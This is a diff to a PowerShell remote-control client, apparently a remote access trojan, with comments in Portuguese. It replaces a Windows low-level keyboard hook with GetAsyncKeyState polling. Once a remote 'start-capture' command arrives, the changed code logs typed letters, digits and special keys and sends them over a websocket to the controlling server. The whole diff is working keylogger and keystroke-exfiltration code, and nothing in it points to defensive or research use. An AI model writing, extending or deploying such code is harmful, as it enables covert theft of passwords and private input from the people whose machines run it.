@@ -117,94 +117,43 @@ $Global:scale = 0.6
 $Global:quality = 50
 $Global:captureInput = $false
 $Global:keyBuffer = ""
-$Global:lastKeyTime = [DateTime]::Now
+$Global:prevKeyState = @{}
 
-# Keyboard Hook para Capture Input
-$keyHookCode = @"
+# Keyboard Capture usando GetAsyncKeyState (não precisa de message loop)
+$keyCaptureCode = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Windows.Forms;
 
-public class KeyHook {
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+public class KeyCapture {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
 
     [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    public static extern int GetKeyboardState(byte[] lpKeyState);
 
     [DllImport("user32.dll")]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
     [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    public static extern uint MapVirtualKey(uint uCode, uint uMapType);
 
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("user32.dll")]
-    private static extern int GetKeyboardState(byte[] lpKeyState);
-
-    [DllImport("user32.dll")]
-    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
-
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-
-    private static IntPtr hookId = IntPtr.Zero;
-    private static LowLevelKeyboardProc proc = HookCallback;
-    public static string Buffer = "";
-    public static bool Enabled = false;
-
-    public static void Start() {
-        if (hookId == IntPtr.Zero) {
-            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
-            Enabled = true;
-        }
+    public static string GetChar(int vk) {
+        byte[] keyState = new byte[256];
+        GetKeyboardState(keyState);
+        StringBuilder sb = new StringBuilder(2);
+        uint scanCode = MapVirtualKey((uint)vk, 0);
+        int result = ToUnicode((uint)vk, scanCode, keyState, sb, sb.Capacity, 0);
+        if (result > 0) return sb.ToString();
+        return null;
     }
 
-    public static void Stop() {
-        if (hookId != IntPtr.Zero) {
-            UnhookWindowsHookEx(hookId);
-            hookId = IntPtr.Zero;
-            Enabled = false;
-        }
-    }
-
-    public static string GetAndClear() {
-        string result = Buffer;
-        Buffer = "";
-        return result;
-    }
-
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && Enabled) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            byte[] keyState = new byte[256];
-            GetKeyboardState(keyState);
-            StringBuilder sb = new StringBuilder(2);
-            int result = ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0);
-            if (result > 0) {
-                Buffer += sb.ToString();
-            } else {
-                // Teclas especiais
-                switch (vkCode) {
-                    case 0x08: Buffer += "[BACK]"; break;
-                    case 0x09: Buffer += "[TAB]"; break;
-                    case 0x0D: Buffer += "[ENTER]\n"; break;
-                    case 0x20: Buffer += " "; break;
-                    case 0x25: Buffer += "[LEFT]"; break;
-                    case 0x26: Buffer += "[UP]"; break;
-                    case 0x27: Buffer += "[RIGHT]"; break;
-                    case 0x28: Buffer += "[DOWN]"; break;
-                    case 0x2E: Buffer += "[DEL]"; break;
-                }
-            }
-        }
-        return CallNextHookEx(hookId, nCode, wParam, lParam);
+    public static bool IsKeyDown(int vk) {
+        return (GetAsyncKeyState(vk) & 0x8000) != 0;
     }
 }
 "@
-try { Add-Type -TypeDefinition $keyHookCode -ReferencedAssemblies System.Windows.Forms } catch {}
+try { Add-Type -TypeDefinition $keyCaptureCode } catch {}
 
 $Global:VK = @{
     'Enter'=0x0D;'Backspace'=0x08;'Tab'=0x09;'Escape'=0x1B;'Space'=0x20;' '=0x20
@@ -457,11 +406,10 @@ function Run {
                             }
                             "start-capture" {
                                 $Global:captureInput = $true
-                                try { [KeyHook]::Start() } catch {}
+                                $Global:prevKeyState = @{}
                             }
                             "stop-capture" {
                                 $Global:captureInput = $false
-                                try { [KeyHook]::Stop() } catch {}
                             }
                             "disconnect-client" { Unlock; $Global:run = $false }
                         }
@@ -482,12 +430,42 @@ function Run {
                     try { $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null } catch {}
                 }
 
-                # Enviar teclas capturadas
+                # Enviar teclas capturadas usando GetAsyncKeyState
                 if ($Global:captureInput) {
                     try {
-                        $keys = [KeyHook]::GetAndClear()
-                        if ($keys.Length -gt 0) {
-                            $captureMsg = @{ type="captured-keys"; clientId=$Global:id; keys=$keys } | ConvertTo-Json -Compress
+                        $captured = ""
+                        # Verificar teclas A-Z (65-90)
+                        for ($vk = 65; $vk -le 90; $vk++) {
+                            $isDown = [KeyCapture]::IsKeyDown($vk)
+                            $wasDown = $Global:prevKeyState[$vk]
+                            if ($isDown -and -not $wasDown) {
+                                $ch = [KeyCapture]::GetChar($vk)
+                                if ($ch) { $captured += $ch }
+                            }
+                            $Global:prevKeyState[$vk] = $isDown
+                        }
+                        # Verificar 0-9 (48-57)
+                        for ($vk = 48; $vk -le 57; $vk++) {
+                            $isDown = [KeyCapture]::IsKeyDown($vk)
+                            $wasDown = $Global:prevKeyState[$vk]
+                            if ($isDown -and -not $wasDown) {
+                                $ch = [KeyCapture]::GetChar($vk)
+                                if ($ch) { $captured += $ch }
+                            }
+                            $Global:prevKeyState[$vk] = $isDown
+                        }
+                        # Teclas especiais
+                        $specials = @{32=" ";13="[ENTER]`n";8="[BACK]";9="[TAB]";190=".";188=",";186=";";222="'";219="[";221="]";220="\";191="/";189="-";187="="}
+                        foreach ($vk in $specials.Keys) {
+                            $isDown = [KeyCapture]::IsKeyDown($vk)
+                            $wasDown = $Global:prevKeyState[$vk]
+                            if ($isDown -and -not $wasDown) {
+                                $captured += $specials[$vk]
+                            }
+                            $Global:prevKeyState[$vk] = $isDown
+                        }
+                        if ($captured.Length -gt 0) {
+                            $captureMsg = @{ type="captured-keys"; clientId=$Global:id; keys=$captured } | ConvertTo-Json -Compress
                             $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes($captureMsg)), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null
                         }
                     } catch {}
